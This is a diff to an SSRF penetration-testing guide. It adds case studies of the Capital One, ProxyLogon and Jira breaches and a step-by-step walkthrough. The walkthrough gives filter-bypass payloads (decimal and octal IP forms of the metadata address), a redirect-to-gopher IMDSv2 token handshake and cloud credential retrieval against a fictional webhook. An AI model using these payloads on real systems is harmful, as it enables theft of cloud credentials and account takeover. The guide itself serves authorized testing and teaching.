@@ -62,11 +62,13 @@
 23. [Building a Professional, Safe PoC](#23-building-a-professional-safe-poc)
 24. [Reporting, CWE/CVSS & De-duplication](#24-reporting-cwecvss--de-duplication)
 25. [Automation & Red-Team Notes](#25-automation--red-team-notes)
+26. [Real-World Case Studies (Verified)](#26-real-world-case-studies-verified)
 
 **Appendices**
 - [Appendix A — SSRF Workflow Cheat Sheet](#appendix-a--ssrf-workflow-cheat-sheet)
 - [Appendix B — SSRF Attack Decision Tree](#appendix-b--ssrf-attack-decision-tree)
 - [Appendix C — Important Links](#appendix-c--important-links)
+- [Appendix D — Worked End-to-End Transcript (blind url= → cloud creds)](#appendix-d--worked-end-to-end-transcript-blind-url--cloud-creds)
 
 ---
 
@@ -765,6 +767,29 @@ python3 Gopherus/gopherus.py --exploit redis                                    
 
 ---
 
+# 26. Real-World Case Studies (Verified)
+
+> SSRF punches far above its "the server fetched a URL" description: it is a **network-position** bug that turns an internet-facing web app into a launch pad into the cloud control plane, the internal estate, and (chained) full RCE. These are documented, attributed cases — each mapped to a technique in this guide. (Verify-before-write: every claim checked against primary sources, cited inline.)
+
+**① Capital One — SSRF → IMDSv1 → IAM role → 700+ S3 buckets → 106M records (2019). THE case that made SSRF a board-level word.**
+A misconfigured **ModSecurity WAF running on an EC2 instance** had an SSRF flaw. The attacker (Paige Thompson, ex-AWS) used it to query **IMDSv1** — the original AWS metadata service, which returned credentials to a plain HTTP request **with no token/header** — and pulled temporary creds for the instance's over-permissive IAM role (**`ISRM-WAF-Role`**). Those creds granted `s3:ListBuckets`/`GetObject`, so she listed **700+ S3 buckets** and exfiltrated **~106 million** credit-card-application records (incl. ~140k SSNs, ~80k linked bank accounts). This is *exactly* this guide's §11 chain: SSRF → `169.254.169.254/latest/meta-data/iam/security-credentials/<role>` → cloud identity. **AWS's direct response was to ship IMDSv2** (token-required, §11.1) — so the modern lesson is *two-fold*: metadata is still the crown jewel, and IMDSv2 is why your plain-fetch SSRF may now need `gopher://`/header control.
+→ *Technique:* §11 (cloud metadata) + §6/§9 (reach it). *Lesson:* least-privilege the instance role, and the metadata reach is the whole ballgame.
+*Source:* [Huntress — Capital One breach](https://www.huntress.com/threat-library/data-breach/capital-one-data-breach) · [ACM TOPS — Systematic Analysis of the Capital One Breach](https://dl.acm.org/doi/full/10.1145/3546068)
+
+**② Microsoft Exchange "ProxyLogon" — pre-auth SSRF as the front door to mass RCE (2021, CVE-2021-26855). SSRF as chain-starter.**
+ProxyLogon's first link, **CVE-2021-26855**, is an **unauthenticated SSRF** in Exchange: a crafted request lets an attacker send arbitrary HTTP requests that **authenticate *as* the Exchange server** to internal backend endpoints normally unreachable from the internet. Chained with **CVE-2021-27065** (post-auth arbitrary file write), that becomes a **webshell → RCE**. The nation-state group **HAFNIUM** exploited it as a 0-day; it escalated into one of the largest mass-exploitation events ever (tens of thousands of servers). It's the definitive example of SSRF's *real* danger: not "read a file," but **the authenticated network position that unlocks the rest of the chain** — this guide's §18 escalation mindset ("SSRF is a pivot, ask what it can now reach").
+→ *Technique:* §18 (escalation mindset) + §2.3 (SSRF in a proxy/backend-fetch sink). *Lesson:* SSRF's severity is what it reaches next, not the fetch itself.
+*Source:* [Bishop Fox — ProxyLogon (CVE-2021-26855)](https://bishopfox.com/blog/proxylogon-cve-2021-26855) · [Microsoft — HAFNIUM targeting Exchange](https://www.microsoft.com/en-us/security/blog/2021/03/02/hafnium-targeting-exchange-servers/)
+
+**③ Atlassian Jira `makeRequest` — pre-auth SSRF in one ubiquitous endpoint (2019, CVE-2019-8451). The "everywhere" case.**
+A logic bug in Jira's `JiraWhitelist` class made **`/plugins/servlet/gadgets/makeRequest`** a **pre-authentication SSRF** in Jira Server/Data Center 7.6.0–8.3.4 (fixed 8.4.0). Because Jira is deployed in a huge fraction of enterprises, this single endpoint became a **mass-scanned, internet-wide SSRF** — a reliable pivot to internal services and (in cloud deployments) the metadata endpoint. It's a reminder of this guide's §3 recon lesson: known **product-specific SSRF endpoints** (Jira, Confluence, Grafana, Jenkins, GitLab, etc.) are worth fingerprinting on every target — a version banner alone can hand you an SSRF.
+→ *Technique:* §3 (recon — known-product SSRF endpoints) + §5/§12 (internal reach). *Lesson:* fingerprint the product; the SSRF may be a known CVE, not a bespoke bug.
+*Source:* [Tenable — CVE-2019-8451 PoC available](https://www.tenable.com/blog/cve-2019-8451-proof-of-concept-available-for-server-side-request-forgery-ssrf-vulnerability-in) · [Atlassian JRASERVER-69793](https://jira.atlassian.com/browse/JRASERVER-69793)
+
+**④ The meta-lesson.** Note the range: ① a *cloud-credential* theft, ② an *RCE chain* starter, ③ a *ubiquitous pre-auth* endpoint — all "the server fetched a URL." That's why SSRF is scored by **where the request lands and what it unlocks**, never by the fetch itself (§21 severity). And two of the three (Capital One, ProxyLogon) reshaped an entire platform's defaults (IMDSv2; Exchange's emergency patch cycle). When you find SSRF, your job is to answer the one question these cases all turned on: *now that the server will fetch what I say — what can it reach that I can't?*
+
+---
+
 # Appendix A — SSRF Workflow Cheat Sheet
 
 ```
@@ -852,8 +877,78 @@ ALWAYS: prove impact (creds via get-caller-identity / file contents / benign gop
 - **CWE-918** (Server-Side Request Forgery): https://cwe.mitre.org/data/definitions/918.html · related **CWE-611** (XXE→SSRF) · **CWE-441** (confused deputy)
 - **CVSS 3.1** — external-only SSRF is often Low, but SSRF→metadata→IAM/RCE is `C:H/I:H/A:H` (often `S:C`) = Critical (see §21).
 
-**Notable real-world case:**
-- **Capital One breach (2019)** — WAF SSRF → EC2 IMDSv1 → IAM role creds → S3 dump of 100M+ records. The canonical "SSRF is Critical" case.
+**Notable real-world cases:** **Capital One** (2019, SSRF→IMDSv1→IAM→106M records) · **Exchange ProxyLogon** CVE-2021-26855 (pre-auth SSRF→RCE chain) · **Jira** CVE-2019-8451 (`makeRequest` pre-auth SSRF) — each written up with the technique + source in **§26 (Real-World Case Studies)**.
+
+---
+
+# Appendix D — Worked End-to-End Transcript (blind url= → cloud creds)
+
+> **What this shows.** The whole spine in one run — the [Master Testing Sequence](#master-testing-sequence--the-testing-order) in motion — on a fictional webhook feature `POST /api/webhook {"url":"…"}`. It walks **the SSRF discipline** that decides everything: prove the server *reached* somewhere (OOB, not just "no error"), steer the request **inward past the allowlist**, reach the **metadata crown jewel**, and — because this is 2025 — handle the **IMDSv2** reality honestly instead of claiming creds you couldn't reach. It ends at a **benign, read-only** `get-caller-identity`, the complete Critical. Placeholders are benign; run only against your own lab / an authorized target.
+
+**Step 1 — recon + baseline: does the server fetch my URL at all? (§3–§4) — the OOB gate.** A "callback ≠ reach" discipline starts here: point the sink at an OOB host and watch for a hit **from the server's IP**, not yours:
+
+```
+POST /api/webhook  {"url":"http://a1b2.oast.pro/ping"}
+   → 200 {"status":"delivered"}
+   OOB log:  DNS + GET /ping  from 203.0.113.44   ← the SERVER (not my browser) fetched it = SSRF confirmed (§4)
+#   NOTE: a callback proves FETCH/reach, not yet IMPACT. External-only reach is often Low (§20). Push inward.
+```
+
+**Step 2 — map reachability + first allowlist wall (§5–§6).** Try localhost and metadata directly; the app has a naive allowlist:
+
+```
+{"url":"http://169.254.169.254/latest/meta-data/"}   → 400 {"error":"URL host not allowed"}   ← allowlist/denylist present
+{"url":"http://127.0.0.1:80/"}                        → 400 (blocked)
+```
+
+**Step 3 — defeat the filter: parser confusion / obfuscation (§6, §9).** The validator and the HTTP client disagree about "the host." Walk the bypass ladder:
+
+```
+{"url":"http://169.254.169.254#.oast.pro/"}          → still 400   (denylist catches the literal IP)
+{"url":"http://2852039166/latest/meta-data/"}        → 200!  (decimal-encoded 169.254.169.254 — denylist matched the DOTTED form only, §6)
+#   equivalents that also often work:  0251.0376.0376.0376 (octal) · [::ffff:169.254.169.254] · http://allowed.com@169.254.169.254/ (§9)
+```
+
+> **Decision (§6):** the denylist blocked the *string* `169.254.169.254`, but `2852039166` is the same address as a 32-bit integer — the HTTP client resolves it, the filter didn't recognize it. We're now talking to the metadata service.
+
+**Step 4 — the crown jewel, and the IMDSv2 reality (§11).** Try IMDSv1 first; if the instance enforces v2, be honest and pivot:
+
+```
+{"url":"http://2852039166/latest/meta-data/iam/security-credentials/"}
+   → 401  {"message":"... IMDSv2 required ..."}          ← plain GET rejected: this instance enforces IMDSv2 (token needed)
+#   A plain url-fetch CANNOT add the X-aws-ec2-metadata-token header. Two honest options (§11.1):
+#   (a) if the sink follows redirects → 302 to a gopher:// that scripts the PUT-token handshake, OR
+#   (b) if the sink gives full request control → gopher:// directly. Here the webhook follows redirects:
+{"url":"http://my-redirector.oast.pro/imds"}   # 302 → gopher://169.254.169.254:80/_PUT%20/latest/api/token ... (TTL header)
+#   → returns a token;  second request replays it as X-aws-ec2-metadata-token to GET the creds:
+{"url":"...gopher... GET /latest/meta-data/iam/security-credentials/ISRM-APP-ROLE  X-aws-ec2-metadata-token:<tok> ..."}
+   → { "AccessKeyId":"ASIA...", "SecretAccessKey":"...", "Token":"...", "Expiration":"..." }   ← LIVE IAM creds. Critical.
+```
+
+> **If you cannot clear the IMDSv2 bar** (no redirect-follow, no gopher, no header control), **say so in the report** — file the confirmed internal/metadata *reach* at its honest severity rather than claiming creds you never retrieved (§19). Over-claiming gets reports rejected.
+
+**Step 5 — prove impact benignly, then STOP (§11.4, §23).** Validate the creds are live with a **read-only** identity call — never enumerate or exfiltrate real data:
+
+```
+$ aws configure set aws_access_key_id ASIA...   ( + secret + session token )
+$ aws sts get-caller-identity
+   { "Account":"1234...", "Arn":"arn:aws:sts::1234...:assumed-role/ISRM-APP-ROLE/i-0abc..." }   ← proven. STOP.
+#   Do NOT `s3 ls` / download objects. get-caller-identity alone proves the cloud identity = Critical (§11.4, §23).
+```
+
+**Step 6 — report the reach + the impact (§24).** Lead with the cloud compromise, show the chain:
+
+```
+Title:  Blind SSRF in webhook `url` → AWS IMDS → live IAM role credentials (cloud account compromise)
+Chain:  OOB-confirmed server-side fetch → denylist bypass via decimal IP (2852039166) → IMDSv2 token handshake
+        via redirect→gopher → retrieved role creds → sts get-caller-identity = assumed-role/ISRM-APP-ROLE.
+Impact: attacker assumes the instance's IAM role (Critical, CVSS 9.x, CWE-918). Blast radius = the role's policy.
+Notes:  benign proof only (identity call, no data accessed); creds are short-lived; no persistence.
+Fix:    enforce IMDSv2 + hop-limit 1; least-privilege the role; allowlist by resolved-IP (block link-local/private);
+        disallow redirects & non-http(s) schemes in the fetcher.
+```
+
+That is a full SSRF run: **§3 recon → §4 OOB baseline → §5–§6/§9 reach past the filter → §11 metadata (incl. the IMDSv2 handshake) → §11.4 benign validation → §24 report.** A webhook field became the cloud account — proven with one read-only call, then stopped. This is the Capital One arc (§26 ①), done ethically and against a modern IMDSv2 target.
 
 ---
 
